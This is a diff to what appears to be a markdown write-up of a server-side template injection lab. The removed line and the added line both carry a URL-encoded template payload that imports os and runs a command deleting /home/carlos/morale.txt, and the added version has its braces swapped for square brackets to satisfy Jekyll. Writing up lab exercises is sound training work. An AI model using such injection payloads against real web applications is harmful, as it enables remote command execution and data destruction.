@@ -147,7 +147,10 @@ blog-post-author-display=user.name}}{{who+am+i}}&csrf=h1GSO6ntbuhd4CD2HaoZw1usIF
 
 To
 
-#blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm+/home/carlos/morale.txt')&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
+**DISCLAIMER**
+Changing curly-bracket notations to normal bracket notations to comply with Jekyll.
+
+blog-post-author-display=user.name]][[%25+import+os+%2][[os.system('rm+/home/carlos/morale.txt')&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
 
 // or // decoded
 
